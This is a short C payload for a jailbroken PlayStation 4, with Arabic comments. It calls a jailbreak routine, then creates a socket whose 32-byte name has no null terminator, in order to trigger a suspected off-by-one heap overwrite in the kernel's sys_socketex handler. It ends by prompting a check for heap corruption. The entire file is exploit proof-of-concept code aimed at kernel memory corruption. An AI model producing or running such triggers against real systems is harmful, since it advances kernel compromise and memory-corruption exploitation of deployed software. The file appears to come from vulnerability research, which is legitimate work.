#include "ps4.h"

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork(); 
    jailbreak();
    initSysUtil();

    printf_debug("=== sys_socketex off-by-one  ===\n");
    printf_debug("socket struct = 0x478 bytes\n");

    // name بطول 0x20 بدون null terminator
    // copyinstr يكتب 0x21 bytes
    char name[0x21];
    memset(name, 0x41, 0x20);  // 'A' * 32
    // لا نضع null! → copyinstr يقرأ byte إضافية

    printf_debug("creating socket with 0x20-byte name (no null)...\n");

    // وهي تمرر name كـ param_1
    int fd = sceNetSocket(name, AF_INET, SOCK_STREAM, 0);

    printf_debug("fd=%d errno=%d\n", fd, sce_net_errno);

    if (fd > 0) {
        printf_debug("[+] socket created!\n");
        printf_debug("[+] off-by-one triggered on socket+0x408\n");

        sceNetSocketClose(fd);
        printf_debug("closed - check for heap corruption\n");
    } else {
        printf_debug("[-] failed\n");
    }

    return 0;
}